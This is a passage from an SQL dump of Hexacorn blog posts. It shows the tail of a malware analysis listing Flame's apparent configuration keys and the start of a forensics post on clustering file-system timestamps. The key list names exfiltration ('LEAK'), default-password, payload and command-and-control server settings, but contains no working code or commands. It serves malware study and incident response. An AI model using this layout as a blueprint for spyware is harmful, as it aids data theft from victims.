ROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.last\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.size\nFROG.DefaultAttacks.B-GetFlameResults.FilesToUpload\nFROG.DefaultAttacks.B-GetFlameResults.FilesToUpload.first\nFROG.DefaultAttacks.B-GetFlameResults.FilesToUpload.free\nFROG.DefaultAttacks.B-GetFlameResults.FilesToUpload.last\nFROG.DefaultAttacks.B-GetFlameResults.FilesToUpload.size\nFROG.DefaultAttacks.B-GetFlameResults.HomeID\nFROG.DefaultAttacks.B-GetFlameResults.MaxRetries\nFROG.DefaultAttacks.B-GetFlameResults.RetriesLeft\nFROG.DefaultAttacks.B-GetFlameResults.SampleInterval\nFROG.DefaultAttacks.B-GetFlameResults.ServiceTimeOut\nFROG.DefaultAttacks.B-GetFlameResults.ShouldRunCMD\nFROG.DefaultAttacks.B-GetFlameResults.TTL\nFROG.DefaultPasswords\nFROG.DefaultPasswords.1\nFROG.DefaultPasswords.1.data\nFROG.DefaultPasswords.1.data.Password\nFROG.DefaultPasswords.1.data.Username\nFROG.DefaultPasswords.1.next\nFROG.DefaultPasswords.1.prev\nFROG.DefaultPasswords.first\nFROG.DefaultPasswords.firstHE\nFROG.DefaultPasswords.free\nFROG.DefaultPasswords.last\nFROG.DefaultPasswords.size\nFROG.DefaultPasswords.sizeer\nFROG.MaxConnectionTime\nFROG.MaxDisconnectionTime\nFROG.MinFreeStoragePercent\nFROG.NextAttackPosition\nFROG.Payloads\nFROG.Payloads.Flame0InstallationBat\nFROG.Payloads.ServiceBuffer\nGADGET\nGADGET.BEETLEJUICE_DATA_COLLECTOR_CONSUMER\nGADGET.BEETLEJUICE_DATA_COLLECTOR_CONSUMER.ENABLED\nGADGET.BEETLEJUICE_DATA_COLLECTOR_CONSUMER.LOG_TRIGGERS\nGADGET.BEETLEJUICE_DATA_COLLECTOR_CONSUMER.RULES\nGADGET.BEETLEJUICE_DATA_COLLECTOR_CONSUMER.RULES.1\nGADGET.BEETLEJUICE_DATA_COLLECTOR_CONSUMER.RULES.1.data\nGADGET.BEETLEJUICE_DATA_COLLECTOR_CONSUMER.RULES.1.data.NAME\nGADGET.BEETLEJUICE_DATA_COLLECTOR_CONSUMER.RULES.1.data.RULE_TYPE\nGADGET.BEETLEJUICE_DATA_COLLECTOR_CONSUMER.RULES.1.data.TRIGGER\nGADGET.BEETLEJUICE_DATA_COLLECTOR_CONSUMER.RULES.1.next\nGADGET.BEETLEJUICE_DATA_COLLECTOR_CONSUMER.RULES.1.prev\nGADGET.BEETLEJUICE_DATA_COLLECTOR_CONSUMER.RULES.first\nGADGET.BEETLEJUICE_DATA_COLLECTOR_CONSUMER.RULES.free\nGADGET.BEETLEJUICE_DATA_COLLECTOR_CONSUMER.RULES.last\nGADGET.BEETLEJUICE_DATA_COLLECTOR_CONSUMER.RULES.size\nGADGET.CLAN_CONSUMER\nGADGET.CLAN_CONSUMER.ENABLED\nGADGET.CLAN_CONSUMER.LOG_TRIGGERS\nGADGET.CLAN_CONSUMER.RULES\nGADGET.CLAN_CONSUMER.RULES.1\nGADGET.CLAN_CONSUMER.RULES.1.data\nGADGET.CLAN_CONSUMER.RULES.1.data.NAME\nGADGET.CLAN_CONSUMER.RULES.1.data.RULE_TYPE\nGADGET.CLAN_CONSUMER.RULES.1.data.TRIGGER\nGADGET.CLAN_CONSUMER.RULES.1.next\nGADGET.CLAN_CONSUMER.RULES.1.next.\nGADGET.CLAN_CONSUMER.RULES.1.prev\nGADGET.CLAN_CONSUMER.RULES.first\nGADGET.CLAN_CONSUMER.RULES.free\nGADGET.CLAN_CONSUMER.RULES.last\nGADGET.CLAN_CONSUMER.RULES.size\nGADGET.CLAN_CONSUMER.RULES.sizeR.\nGADGET.CMD_CONSUMER\nGADGET.CMD_CONSUMER.COMMANDS\nGADGET.CMD_CONSUMER.COMMANDS.LEAK_NOW\nGADGET.CMD_CONSUMER.ENABLED\nGADGET.CMD_CONSUMER.LOG_TRIGGERS\nGADGET.CMD_CONSUMER.RULES\nGADGET.CMD_CONSUMER.RULES.1\nGADGET.CMD_CONSUMER.RULES.1.data\nGADGET.CMD_CONSUMER.RULES.1.data.COMMAND\nGADGET.CMD_CONSUMER.RULES.1.data.EXEC_IMMEDIATELY\nGADGET.CMD_CONSUMER.RULES.1.data.NAME\nGADGET.CMD_CONSUMER.RULES.1.data.RULE_TYPE\nGADGET.CMD_CONSUMER.RULES.1.data.RULE_TYPEMS.\nGADGET.CMD_CONSUMER.RULES.1.data.SUB_RULES\nGADGET.CMD_CONSUMER.RULES.1.data.SUB_RULES.1\nGADGET.CMD_CONSUMER.RULES.1.data.SUB_RULES.1.data\nGADGET.CMD_CONSUMER.RULES.1.data.SUB_RULES.1.data.IP\nGADGET.CMD_CONSUMER.RULES.1.data.SUB_RULES.1.data.NAME\nGADGET.CMD_CONSUMER.RULES.1.data.SUB_RULES.1.data.RULE_TYPE\nGADGET.CMD_CONSUMER.RULES.1.data.SUB_RULES.1.data.SUBNET\nGADGET.CMD_CONSUMER.RULES.1.data.SUB_RULES.1.next\nGADGET.CMD_CONSUMER.RULES.1.data.SUB_RULES.1.prev\nGADGET.CMD_CONSUMER.RULES.1.data.SUB_RULES.first\nGADGET.CMD_CONSUMER.RULES.1.data.SUB_RULES.free\nGADGET.CMD_CONSUMER.RULES.1.data.SUB_RULES.freeT\nGADGET.CMD_CONSUMER.RULES.1.data.SUB_RULES.last\nGADGET.CMD_CONSUMER.RULES.1.data.SUB_RULES.size\nGADGET.CMD_CONSUMER.RULES.1.next\nGADGET.CMD_CONSUMER.RULES.1.next.\nGADGET.CMD_CONSUMER.RULES.1.prev\nGADGET.CMD_CONSUMER.RULES.1.prevG\nGADGET.CMD_CONSUMER.RULES.first\nGADGET.CMD_CONSUMER.RULES.firstta\nGADGET.CMD_CONSUMER.RULES.free\nGADGET.CMD_CONSUMER.RULES.free311\nGADGET.CMD_CONSUMER.RULES.last\nGADGET.CMD_CONSUMER.RULES.size\nGADGET.CRUISE_CONSUMER\nGADGET.CRUISE_CONSUMER.ENABLED\nGADGET.CRUISE_CONSUMER.ENABLEDY.B\nGADGET.CRUISE_CONSUMER.LOG_TRIGGERS\nGADGET.CRUISE_CONSUMER.RULES\nGADGET.CRUISE_CONSUMER.RULES.1\nGADGET.CRUISE_CONSUMER.RULES.1.data\nGADGET.CRUISE_CONSUMER.RULES.1.data.NAME\nGADGET.CRUISE_CONSUMER.RULES.1.data.RULE_TYPE\nGADGET.CRUISE_CONSUMER.RULES.1.data.TRIGGER\nGADGET.CRUISE_CONSUMER.RULES.1.data.TRIGGERRV\nGADGET.CRUISE_CONSUMER.RULES.1.next\nGADGET.CRUISE_CONSUMER.RULES.1.nextEY\nGADGET.CRUISE_CONSUMER.RULES.1.prev\nGADGET.CRUISE_CONSUMER.RULES.first\nGADGET.CRUISE_CONSUMER.RULES.firstN\nGADGET.CRUISE_CONSUMER.RULES.free\nGADGET.CRUISE_CONSUMER.RULES.last\nGADGET.CRUISE_CONSUMER.RULES.size\nGADGET.LOG_CONSUMER\nGADGET.LOG_CONSUMER.ENABLED\nGADGET.LOG_CONSUMER.LOG_TRIGGERS\nGADGET.LOG_CONSUMER.RULES\nGADGET.LOG_CONSUMER.RULES.1\nGADGET.LOG_CONSUMER.RULES.1.data\nGADGET.LOG_CONSUMER.RULES.1.data.NAME\nGADGET.LOG_CONSUMER.RULES.1.data.RULE_TYPE\nGADGET.LOG_CONSUMER.RULES.1.data.TRIGGER\nGADGET.LOG_CONSUMER.RULES.1.next\nGADGET.LOG_CONSUMER.RULES.1.prev\nGADGET.LOG_CONSUMER.RULES.10\nGADGET.LOG_CONSUMER.RULES.10.data\nGADGET.LOG_CONSUMER.RULES.10.data.IP\nGADGET.LOG_CONSUMER.RULES.10.data.NAME\nGADGET.LOG_CONSUMER.RULES.10.data.NAMEME\nGADGET.LOG_CONSUMER.RULES.10.data.RULE_TYPE\nGADGET.LOG_CONSUMER.RULES.10.data.SUBNET\nGADGET.LOG_CONSUMER.RULES.10.next\nGADGET.LOG_CONSUMER.RULES.10.prev\nGADGET.LOG_CONSUMER.RULES.2\nGADGET.LOG_CONSUMER.RULES.2.data\nGADGET.LOG_CONSUMER.RULES.2.data.NAME\nGADGET.LOG_CONSUMER.RULES.2.data.RULE_TYPE\nGADGET.LOG_CONSUMER.RULES.2.data.TRIGGER\nGADGET.LOG_CONSUMER.RULES.2.next\nGADGET.LOG_CONSUMER.RULES.2.prev\nGADGET.LOG_CONSUMER.RULES.3\nGADGET.LOG_CONSUMER.RULES.3.data\nGADGET.LOG_CONSUMER.RULES.3.data.LOCAL_IP\nGADGET.LOG_CONSUMER.RULES.3.data.LOCAL_PORT\nGADGET.LOG_CONSUMER.RULES.3.data.NAME\nGADGET.LOG_CONSUMER.RULES.3.data.REMOTE_IP\nGADGET.LOG_CONSUMER.RULES.3.data.REMOTE_PORT\nGADGET.LOG_CONSUMER.RULES.3.data.RULE_TYPE\nGADGET.LOG_CONSUMER.RULES.3.next\nGADGET.LOG_CONSUMER.RULES.3.prev\nGADGET.LOG_CONSUMER.RULES.4\nGADGET.LOG_CONSUMER.RULES.4.data\nGADGET.LOG_CONSUMER.RULES.4.data.LOCAL_IP\nGADGET.LOG_CONSUMER.RULES.4.data.LOCAL_PORT\nGADGET.LOG_CONSUMER.RULES.4.data.NAME\nGADGET.LOG_CONSUMER.RULES.4.data.REMOTE_IP\nGADGET.LOG_CONSUMER.RULES.4.data.REMOTE_PORT\nGADGET.LOG_CONSUMER.RULES.4.data.RULE_TYPE\nGADGET.LOG_CONSUMER.RULES.4.next\nGADGET.LOG_CONSUMER.RULES.4.prev\nGADGET.LOG_CONSUMER.RULES.5\nGADGET.LOG_CONSUMER.RULES.5.data\nGADGET.LOG_CONSUMER.RULES.5.data.LOCAL_IP\nGADGET.LOG_CONSUMER.RULES.5.data.LOCAL_PORT\nGADGET.LOG_CONSUMER.RULES.5.data.NAME\nGADGET.LOG_CONSUMER.RULES.5.data.REMOTE_IP\nGADGET.LOG_CONSUMER.RULES.5.data.REMOTE_PORT\nGADGET.LOG_CONSUMER.RULES.5.data.RULE_TYPE\nGADGET.LOG_CONSUMER.RULES.5.next\nGADGET.LOG_CONSUMER.RULES.5.prev\nGADGET.LOG_CONSUMER.RULES.6\nGADGET.LOG_CONSUMER.RULES.6.data\nGADGET.LOG_CONSUMER.RULES.6.data.LOCAL_IP\nGADGET.LOG_CONSUMER.RULES.6.data.LOCAL_PORT\nGADGET.LOG_CONSUMER.RULES.6.data.NAME\nGADGET.LOG_CONSUMER.RULES.6.data.REMOTE_IP\nGADGET.LOG_CONSUMER.RULES.6.data.REMOTE_PORT\nGADGET.LOG_CONSUMER.RULES.6.data.RULE_TYPE\nGADGET.LOG_CONSUMER.RULES.6.next\nGADGET.LOG_CONSUMER.RULES.6.prev\nGADGET.LOG_CONSUMER.RULES.7\nGADGET.LOG_CONSUMER.RULES.7.data\nGADGET.LOG_CONSUMER.RULES.7.data.LOCAL_IP\nGADGET.LOG_CONSUMER.RULES.7.data.LOCAL_PORT\nGADGET.LOG_CONSUMER.RULES.7.data.NAME\nGADGET.LOG_CONSUMER.RULES.7.data.REMOTE_IP\nGADGET.LOG_CONSUMER.RULES.7.data.REMOTE_PORT\nGADGET.LOG_CONSUMER.RULES.7.data.RULE_TYPE\nGADGET.LOG_CONSUMER.RULES.7.next\nGADGET.LOG_CONSUMER.RULES.7.prev\nGADGET.LOG_CONSUMER.RULES.8\nGADGET.LOG_CONSUMER.RULES.8.data\nGADGET.LOG_CONSUMER.RULES.8.data.LOCAL_IP\nGADGET.LOG_CONSUMER.RULES.8.data.LOCAL_PORT\nGADGET.LOG_CONSUMER.RULES.8.data.NAME\nGADGET.LOG_CONSUMER.RULES.8.data.REMOTE_IP\nGADGET.LOG_CONSUMER.RULES.8.data.REMOTE_PORT\nGADGET.LOG_CONSUMER.RULES.8.data.RULE_TYPE\nGADGET.LOG_CONSUMER.RULES.8.next\nGADGET.LOG_CONSUMER.RULES.8.nextE\nGADGET.LOG_CONSUMER.RULES.8.prev\nGADGET.LOG_CONSUMER.RULES.8.prev.\nGADGET.LOG_CONSUMER.RULES.9\nGADGET.LOG_CONSUMER.RULES.9.data\nGADGET.LOG_CONSUMER.RULES.9.data.LOCAL_IP\nGADGET.LOG_CONSUMER.RULES.9.data.LOCAL_IP’\nGADGET.LOG_CONSUMER.RULES.9.data.LOCAL_PORT\nGADGET.LOG_CONSUMER.RULES.9.data.NAME\nGADGET.LOG_CONSUMER.RULES.9.data.REMOTE_IP\nGADGET.LOG_CONSUMER.RULES.9.data.REMOTE_PORT\nGADGET.LOG_CONSUMER.RULES.9.data.RULE_TYPE\nGADGET.LOG_CONSUMER.RULES.9.next\nGADGET.LOG_CONSUMER.RULES.9.prev\nGADGET.LOG_CONSUMER.RULES.first\nGADGET.LOG_CONSUMER.RULES.free\nGADGET.LOG_CONSUMER.RULES.free!\nGADGET.LOG_CONSUMER.RULES.last\nGADGET.LOG_CONSUMER.RULES.size\nGADGET.LUA_CONSUMER\nGADGET.LUA_CONSUMER.ENABLED\nGADGET.LUA_CONSUMER.LOG_TRIGGERS\nGADGET.LUA_CONSUMER.LOG_TRIGGERS.\nGADGET.LUA_CONSUMER.MUNCH_ATTACKED\nGADGET.LUA_CONSUMER.MUNCH_ATTACKED.SCRIPT\nGADGET.LUA_CONSUMER.RULES\nGADGET.LUA_CONSUMER.RULES.1\nGADGET.LUA_CONSUMER.RULES.1.data\nGADGET.LUA_CONSUMER.RULES.1.data.NAME\nGADGET.LUA_CONSUMER.RULES.1.data.RULE_TYPE\nGADGET.LUA_CONSUMER.RULES.1.data.TRIGGER\nGADGET.LUA_CONSUMER.RULES.1.next\nGADGET.LUA_CONSUMER.RULES.1.prev\nGADGET.LUA_CONSUMER.RULES.2\nGADGET.LUA_CONSUMER.RULES.2.data\nGADGET.LUA_CONSUMER.RULES.2.data.NAME\nGADGET.LUA_CONSUMER.RULES.2.data.RULE_TYPE\nGADGET.LUA_CONSUMER.RULES.2.data.TRIGGER\nGADGET.LUA_CONSUMER.RULES.2.next\nGADGET.LUA_CONSUMER.RULES.2.prev\nGADGET.LUA_CONSUMER.RULES.first\nGADGET.LUA_CONSUMER.RULES.firstte\nGADGET.LUA_CONSUMER.RULES.free\nGADGET.LUA_CONSUMER.RULES.last\nGADGET.LUA_CONSUMER.RULES.size\nGADGET.LUA_CONSUMER.SNACK_ENTITY\nGADGET.LUA_CONSUMER.SNACK_ENTITY.ADD_TO_DB\nGADGET.LUA_CONSUMER.SNACK_ENTITY.ATTACK_NOW\nGADGET.RUN_SHARE_SUPPLIER\nGADGET.SHARE_ENUM_TIMEOUT\nGADGET.SHARE_SUPPLIER_IDLE_TIME\nGADGET.TCP_SUPPLIER_IDLE_TIME\nGATOR\nGATOR.CMD\nGATOR.CMD.FAILURE_VALIDITY\nGATOR.CMD.SUCCESS_VALIDITY\nGATOR.INTERNET_CHECK\nGATOR.INTERNET_CHECK.CURRENT_FAILURES_COUNT\nGATOR.INTERNET_CHECK.MAX_SUCCESSFUL_CHECKS_LIST_LENGTH\nGATOR.INTERNET_CHECK.MAX_TIME_BETWEEN_CHECKS\nGATOR.INTERNET_CHECK.MIN_TIME_BETWEEN_CHECKS\nGATOR.INTERNET_CHECK.MULTIPLY_FACTOR\nGATOR.INTERNET_CHECK.NUM_OF_FAILURES_UNTIL_BACKOFF\nGATOR.INTERNET_CHECK.SERVERS\nGATOR.INTERNET_CHECK.SERVERS.1\nGATOR.INTERNET_CHECK.SERVERS.1.data\nGATOR.INTERNET_CHECK.SERVERS.1.data.PORT\nGATOR.INTERNET_CHECK.SERVERS.1.data.SITE\nGATOR.INTERNET_CHECK.SERVERS.1.data.TIMEOUT\nGATOR.INTERNET_CHECK.SERVERS.1.data.URL\nGATOR.INTERNET_CHECK.SERVERS.1.data.USESSL\nGATOR.INTERNET_CHECK.SERVERS.1.data.VALIDITY\nGATOR.INTERNET_CHECK.SERVERS.1.next\nGATOR.INTERNET_CHECK.SERVERS.1.prev\nGATOR.INTERNET_CHECK.SERVERS.2\nGATOR.INTERNET_CHECK.SERVERS.2.data\nGATOR.INTERNET_CHECK.SERVERS.2.data.PORT\nGATOR.INTERNET_CHECK.SERVERS.2.data.SITE\nGATOR.INTERNET_CHECK.SERVERS.2.data.TIMEOUT\nGATOR.INTERNET_CHECK.SERVERS.2.data.URL\nGATOR.INTERNET_CHECK.SERVERS.2.data.USESSL\nGATOR.INTERNET_CHECK.SERVERS.2.data.VALIDITY\nGATOR.INTERNET_CHECK.SERVERS.2.next\nGATOR.INTERNET_CHECK.SERVERS.2.prev\nGATOR.INTERNET_CHECK.SERVERS.3\nGATOR.INTERNET_CHECK.SERVERS.3.data\nGATOR.INTERNET_CHECK.SERVERS.3.data.PORT\nGATOR.INTERNET_CHECK.SERVERS.3.data.SITE\nGATOR.INTERNET_CHECK.SERVERS.3.data.TIMEOUT\nGATOR.INTERNET_CHECK.SERVERS.3.data.URL\nGATOR.INTERNET_CHECK.SERVERS.3.data.USESSL\nGATOR.INTERNET_CHECK.SERVERS.3.data.VALIDITY\nGATOR.INTERNET_CHECK.SERVERS.3.next\nGATOR.INTERNET_CHECK.SERVERS.3.prev\nGATOR.INTERNET_CHECK.SERVERS.4\nGATOR.INTERNET_CHECK.SERVERS.4.data\nGATOR.INTERNET_CHECK.SERVERS.4.data.PORT\nGATOR.INTERNET_CHECK.SERVERS.4.data.SITE\nGATOR.INTERNET_CHECK.SERVERS.4.data.TIMEOUT\nGATOR.INTERNET_CHECK.SERVERS.4.data.URL\nGATOR.INTERNET_CHECK.SERVERS.4.data.USESSL\nGATOR.INTERNET_CHECK.SERVERS.4.data.VALIDITY\nGATOR.INTERNET_CHECK.SERVERS.4.next\nGATOR.INTERNET_CHECK.SERVERS.4.prev\nGATOR.INTERNET_CHECK.SERVERS.5\nGATOR.INTERNET_CHECK.SERVERS.5.data\nGATOR.INTERNET_CHECK.SERVERS.5.data.PORT\nGATOR.INTERNET_CHECK.SERVERS.5.data.SITE\nGATOR.INTERNET_CHECK.SERVERS.5.data.TIMEOUT\nGATOR.INTERNET_CHECK.SERVERS.5.data.URL\nGATOR.INTERNET_CHECK.SERVERS.5.data.USESSL\nGATOR.INTERNET_CHECK.SERVERS.5.data.VALIDITY\nGATOR.INTERNET_CHECK.SERVERS.5.next\nGATOR.INTERNET_CHECK.SERVERS.5.prev\nGATOR.INTERNET_CHECK.SERVERS.6\nGATOR.INTERNET_CHECK.SERVERS.6.data\nGATOR.INTERNET_CHECK.SERVERS.6.data.PORT\nGATOR.INTERNET_CHECK.SERVERS.6.data.SITE\nGATOR.INTERNET_CHECK.SERVERS.6.data.TIMEOUT\nGATOR.INTERNET_CHECK.SERVERS.6.data.URL\nGATOR.INTERNET_CHECK.SERVERS.6.data.USESSL\nGATOR.INTERNET_CHECK.SERVERS.6.data.VALIDITY\nGATOR.INTERNET_CHECK.SERVERS.6.next\nGATOR.INTERNET_CHECK.SERVERS.6.prev\nGATOR.INTERNET_CHECK.SERVERS.first\nGATOR.INTERNET_CHECK.SERVERS.free\nGATOR.INTERNET_CHECK.SERVERS.last\nGATOR.INTERNET_CHECK.SERVERS.size\nGATOR.INTERNET_CHECK.SUCCESS_VALIDITY\nGATOR.INTERNET_CHECK.SUCCESSFULL_INTERNET_TIMES\nGATOR.INTERNET_CHECK.SUCCESSFULL_INTERNET_TIMES.first\nGATOR.INTERNET_CHECK.SUCCESSFULL_INTERNET_TIMES.free\nGATOR.INTERNET_CHECK.SUCCESSFULL_INTERNET_TIMES.last\nGATOR.INTERNET_CHECK.SUCCESSFULL_INTERNET_TIMES.size\nGATOR.LEAK\nGATOR.LEAK.BANDWITH_CALCULATOR\nGATOR.LEAK.BANDWITH_CALCULATOR.LEAK_SECS\nGATOR.LEAK.BANDWITH_CALCULATOR.MAX_SIZE_TO_LEAK\nGATOR.LEAK.BANDWITH_CALCULATOR.MIN_BPS\nGATOR.LEAK.BANDWITH_CALCULATOR.MIN_SIZE_TO_USE\nGATOR.LEAK.FAILURE_VALIDITY\nGATOR.LEAK.HIGH_BW_ENV_IDENTIFIER\nGATOR.LEAK.MAX_LEAK_SIZE\nGATOR.LEAK.MAX_LEAK_SIZE_LOW_BW\nGATOR.LEAK.MIN_BYTES_TO_LEAK\nGATOR.LEAK.SUCCESS_VALIDITY\nGATOR.LEAK.SUICIDE_LOG_LEAK_SIZE\nGATOR.LEAK.SUICIDE_LOG_LEAK_TIMEOUT_MSECS\nGATOR.LEAK.USE_CALCULATOR\nGATOR.NET_LOG_CFG\nGATOR.NET_LOG_CFG.NET_LOG_INTERVAL\nGATOR.PROXY_DATA\nGATOR.PROXY_DATA.ALL_PROXY_ENABLE_TYPE\nGATOR.PROXY_DATA.AUTO_CONFIG_URL\nGATOR.PROXY_DATA.PROXY_OVERRIDE\nGATOR.PROXY_DATA.PROXY_SERVER\nGATOR.PROXY_DATA.PROXY_SETTINGS_FETCH_MODE\nGATOR.PROXY_DATA.REGULAR_PROXY_ENABLE\nGATOR.SERVERS\nGATOR.SERVERS.1\nGATOR.SERVERS.1.data\nGATOR.SERVERS.1.data.PASSWORD\nGATOR.SERVERS.1.data.PORT\nGATOR.SERVERS.1.data.SITE\nGATOR.SERVERS.1.data.TIMEOUT\nGATOR.SERVERS.1.data.URL\nGATOR.SERVERS.1.data.USESSL\nGATOR.SERVERS.1.next\nGATOR.SERVERS.1.prev\nGATOR.SERVERS.2\nGATOR.SERVERS.2.data\nGATOR.SERVERS.2.data.PASSWORD\nGATOR.SERVERS.2.data.PORT\nGATOR.SERVERS.2.data.SITE\nGATOR.SERVERS.2.data.TIMEOUT\nGATOR.SERVERS.2.data.URL\nGATOR.SERVERS.2.data.USESSL\nGATOR.SERVERS.2.next\nGATOR.SERVERS.2.prev\nGATOR.SERVERS.3\nGATOR.SERVERS.3.data\nGATOR.SERVERS.3.data.PASSWORD\nGATOR.SERVERS.3.data.PORT\nGATOR.SERVERS.3.data.SITE\nGATOR.SERVERS.3.data.TIMEOUT\nGATOR.SERVERS.3.data.URL\nGATOR.SERVERS.3.data.USESSL\nGATOR.SERVERS.3.next\nGATOR.SERVERS.3.prev\nGATOR.SERVERS.4\nGATOR.SERVERS.4.data\nGATOR.SERVERS.4.data.PASSWORD\nGATOR.SERVERS.4.data.PORT\nGATOR.SERVERS.4.data.SITE\nGATOR.SERVERS.4.data.TIMEOUT\nGATOR.SERVERS.4.data.URL\nGATOR.SERVERS.4.data.USESSL\nGATOR.SERVERS.4.next\nGATOR.SERVERS.4.prev\nGATOR.SERVERS.5\nGATOR.SERVERS.5.data\nGATOR.SERVERS.5.data.PASSWORD\nGATOR.SERVERS.5.data.PORT\nGATOR.SERVERS.5.data.SITE\nGATOR.SERVERS.5.data.TIMEOUT\nGATOR.SERVERS.5.data.URL\nGATOR.SERVERS.5.data.USESSL\nGATOR.SERVERS.5.next\nGATOR.SERVERS.5.prev\nGATOR.SERVERS.first\nGATOR.SERVERS.free\nGATOR.SERVERS.last\nGATOR.SERVERS.size\nHEADACHE\nHEADACHE.BoostConsumer\nHEADACHE.BoostConsumer.first\nHEADACHE.BoostConsumer.free\nHEADACHE.BoostConsumer.last\nHEADACHE.BoostConsumer.size\nHEADACHE.HEADACHE_CONSUMERS\nHEADACHE.HEADACHE_CONSUMERS.JIMMY_CONSUMER\nHEADACHE.HEADACHE_CONSUMERS.JIMMY_CONSUMER.JIMMY_CONFIGURATION\nHEADACHE.HEADACHE_CONSUMERS.JIMMY_CONSUMER.JIMMY_CONFIGURATION0\nHEADACHE.HEADACHE_CONSUMERS.JIMMY_CONSUMER.JIMMY_CONFIGURATION_MAGIC_SIZE\nHEADACHE.HEADACHE_CONSUMERS.JIMMY_CONSUMER.STORAGE_PRIORITY\nHEADACHE.HEADACHE_CONSUMERS.JIMMY_CONSUMER.TIME_TO_SLEEP_BEFORE_RUN\nHEADACHE.HEADACHE_CONSUMERS.LEAK_FILE_CONSUMER\nHEADACHE.HEADACHE_CONSUMERS.LEAK_FILE_CONSUMER.FILES_LIST\nHEADACHE.HEADACHE_CONSUMERS.LEAK_FILE_CONSUMER.FILES_LIST.first\nHEADACHE.HEADACHE_CONSUMERS.LEAK_FILE_CONSUMER.FILES_LIST.free\nHEADACHE.HEADACHE_CONSUMERS.LEAK_FILE_CONSUMER.FILES_LIST.last\nHEADACHE.HEADACHE_CONSUMERS.LEAK_FILE_CONSUMER.FILES_LIST.size\nHEADACHE.HEADACHE_CONSUMERS.LEAK_FILE_CONSUMER.FILES_LIST.sizeJIM\nHEADACHE.HEADACHE_CONSUMERS.LEAK_FILE_CONSUMER.SHOULD_RUN\nHEADACHE.HEADACHE_CONSUMERS.TDB_EXTRACTOR\nHEADACHE.HEADACHE_CONSUMERS.TDB_EXTRACTOR.PRIORITY\nHEADACHE.HEADACHE_CONSUMERS.TDB_EXTRACTOR.PRIORITYST\nHEADACHE.JimmyConsumer\nHEADACHE.JimmyConsumer.first\nHEADACHE.JimmyConsumer.free\nHEADACHE.JimmyConsumer.freeS.\nHEADACHE.JimmyConsumer.last\nHEADACHE.JimmyConsumer.lastEA\nHEADACHE.JimmyConsumer.size\nHEADACHE.LeakFileConsumer\nHEADACHE.LeakFileConsumer.first\nHEADACHE.LeakFileConsumer.firstv\nHEADACHE.LeakFileConsumer.free\nHEADACHE.LeakFileConsumer.last\nHEADACHE.LeakFileConsumer.size\nHEADACHE.LeakFileConsumer.sizeHRE\nINSTALL\nINSTALL.SHOULD_CLEAN_INSTALL\nINSTALL.UPGRADE_TYPE\nLEAK\nLEAK.BUFFER_LEAKER_MAX_ALLOWED_SECONDS_FOR_LEAK\nLEAK.LEAK_IS_SIGNAL_FROM_HOME\nLEAK.LOG_PERCENTAGE\nLEAK.MAX_PRIORITY_THRESHOLD\nLEAK.PRIORITY_DIVIS', 'Malware Analysis', 'http://www.hexacorn.com/blog/2012/05/29/quick-look-at/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (368, 'Permanent Link to Cluester – clustering as a data reduction technique', 'Hexacorn', 'May 27, 2012 ', 'In this post I present a simple technique that can be quite helpful when you hit the wall during your analysis and don’t know what else to do. The idea relies on cluster analysis a.k.a. clustering. Notably, the implementation of this technique is very simple, but is hard to generalize – it depends very much on case and data. In an an example below I focus on Windows file system cluster analysis that are focused mainly on discovering minor, but grouped changes to the system – usually these are associated with a malware infection.\nA typical computer forensics case deals with a tremendous amount of data and whether we analyze it in an automated fashion or walk our way through evidence manually we are pretty much wasting our time until we finally find the first clue. Purists could say here that we are not really wasting our time as we are slowly ruling out the possibilities and they are right, but I hope they will agree that such analysis are not fun. It can be quite frustrating, and more so as we know that finding that first trace of suspicious activity is what will shape further analysis – in fact it is what really kicks off the proper investigation (and this is also where the fun begins :)).\nBut finding that first piece of puzzle is not a trivial task. For many reasons. If you are lucky you may find malware still running in memory, the evidence has not been contaminated, or the clues are all over the place. In many cases though, the evidence may have been already contaminated by the attackers or ‘helpful’ IT staff that cleaned up the system before the data acquisition. There may be no malware involved at all as the case is dealing with a contraband, fraud, plagiarism or other issues. Also, in many production environment there is a lot changes introduced to the system on regular basis (e.g. via system updates, transaction records, logs, etc.), often saved into separate files generating large amount of small files. Analyzing such systems can be a real nightmare (e.g. a hundreds of thousands files on a single file systems).\nOver the years  investigators designed many techniques to sift through the data and adapted them into many useful tools and methodologies. We have got Timelines, Filetyping, various filtering, Least Frequency of Occurrence, and many other system- or artifact-specific analysis e.g. these of processes, registry, prefetch files etc.\nA typical Windows system is a mess. Operating system files, applications, user profiles, data copied all over the place by users (often many of them), followed by the content of temp folders, cache directories, recycled folders, admin scripts, registry clutter, and production data (if it applies). And lots more.\nHow to reduce this data into something useful?\nOne easy way to make some sense of it is by using filtering e.g. by file typing. Files with specific extensions can be grouped together and such groups assessed one by one. This may work, but is also very inefficient. There could be literally hundreds of thousands files of the same file extension. There are also hundreds, often thousands of different file extensions on the system. On top of that, file extension is not necessary indicative of a file content (.exe file doesn’t need to be an executable, and pictures or executable can be stored in files with misleading extensions).\nAnother way to look at the file system is to realize that file system changes are logically grouped and often happen in an atomic or almost-atomic way i.e. all at once within a short period of time – forming pretty much a sequence of ‘file system updates’. These are clusters we will try to focus on here. These updates often happen on regular intervals and affect only specific paths. Knowing that one can try to build an improved timeline, based not on all timestamps, but on ranges of timestamps.\nFirst, an example of a typical timeline is shown below – one can see that I have copied grep.exe to the system together with  Cygwin DLLs that are necessary to run the grep.exe (as it was unable to resolve dependencies). I then ran it (as see with a Prefetch files). Next, I copied sleuthkit binaries into a tools directory and ran fls.exe creating a list file that I used for the purpose of this article.\n\nAs you can see, the sleuthkit binaries form a nice cluster. The script I used to generate the listing takes into account a number of files created at the same time and if the number of files is higher than 10, it pushes the file list to the right. Under normal conditions, the script wouldn’t need to print them at all, but I do it here for the sake of clarity with a hint to the reader that such a large ‘file update’ may be potentially skipped in analysis. One can easily modify the script to either not show them at all or perhaps apply some more logic before presenting the output. Of course, completely ignoring it is a wrong idea as only by seeing the example above you can tell that I happened to drop some files on the system. Again, depends on what you are looking for, you need to define the criteria that form your clusters and push out of the sight things that are not interesting.\nOne simple improvement that can be made to the timeline and clustering is timestamp normalization. By normalization I mean a way to glue more timestamps together, even if they do not match perfectly. It can be done in many way, for example:  if we assume that the window of atomic operation or almost-atomic ‘file system update’  is e.g. 10 or even whole 60 seconds, suddenly we will be able to increase our ability to assign more entries into a single cluster. More entries in a cluster, more chances for it to fall out of sight.\nIn my example above, merging the entries that fall within 60 seconds time window makes all grep-related artifacts be fall into one cluster:\n\nThe first column is 